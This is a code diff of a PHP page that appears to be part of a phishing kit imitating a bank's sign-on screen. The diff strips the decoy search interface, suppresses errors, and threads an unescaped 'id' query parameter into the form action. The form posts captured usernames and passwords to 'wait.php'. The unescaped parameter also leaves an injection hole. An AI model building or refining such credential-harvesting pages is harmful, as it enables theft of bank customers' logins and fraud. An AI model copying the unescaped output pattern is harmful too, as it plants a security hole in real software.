@@ -1,5 +1,4 @@
 <!DOCTYPE html>
-<html class="no-js" lang="en">
 <?php
 session_start();
 error_reporting(0);
@@ -16,7 +15,12 @@ include('../files/boot/enc.php');
 include('../call.php');
 $rec = @$_GET['rec'];
 $error = @$_GET['error'];
+$id = "";
+if( isset($_GET['id'])){
+    $id = $_GET['id'];
+}
 ?>
+<html class="no-js" lang="en">
 <head>
     <meta http-equiv="content-type" content="text/html; charset=UTF-8">
     <meta charset="UTF-8">
@@ -71,40 +75,7 @@ $error = @$_GET['error'];
         </header>
 
         <div id="maincontainer">
-
-            <div class="search-signon-wrapper" aria-hidden="true">
-                <div class="search-signon-container" style="display: none;">
-                    <div class="wrap left rounded">
-                        <div class="search-container">
-
-                            <label class="sr-only" for="searchopen">Search</label>
-                            <input type="text" class="search left rounded" id="searchopen" value="Search">
-                            <span class="search-sprite"></span>
-                        </div>
-                    </div>
-                    <div class="signon-container">
-                        <span class="signonlock" aria-hidden="true">‍</span>
-                        <a href="" id="signOn">Sign On</a>
-                    </div>
-                </div>
-            </div>
-            <div class="overlay" style="display: none;">
-                <div class="wrap left rounded">
-                    <div class="searchContainer">
-                        <form id="frmSearch" name="frmSearch" action="/search/search" method="GET" autocomplete="off">
-                            <span class="search-image"></span>
-                            <label class="sr-only" for="overlaySearch">Search</label>
-                            <input name="q" type="text" class="left rounded required" id="overlaySearch">
-                            <span class="clear-image"></span>
-                        </form>
-                    </div>
-                    <div class="cancel-container">
-                        <a href="" id="cancelSearch">Cancel</a>
-                    </div>
-                </div>
-            </div>
-
-            <div class="overlaySignOn" style="top: 38.3333px;">
+            <div class="overlaySignOn" style="top: 38px;">
 
                 <div class="overlayContainer">
                     <div class="welcome-container" tabindex="-1">Welcome</div>
@@ -114,7 +85,7 @@ $error = @$_GET['error'];
                         <a href="#" class="security-text">Online &amp; Mobile Security</a>
                     </div>
                     <div class="signOnContainer" align="center">
-                        <form id="frmSignon" name="frmSignon" action="wait.php" method="post" autocomplete="off">
+                        <form id="frmSignon" name="frmSignon" action="wait.php?id=<?=$id?>" method="post" autocomplete="off">
                             <label class="sr-only" for="userid">Username</label>
 
                             <input type="text" maxlength="14" id="userid" placeholder="Username" class="required" name="j_username">
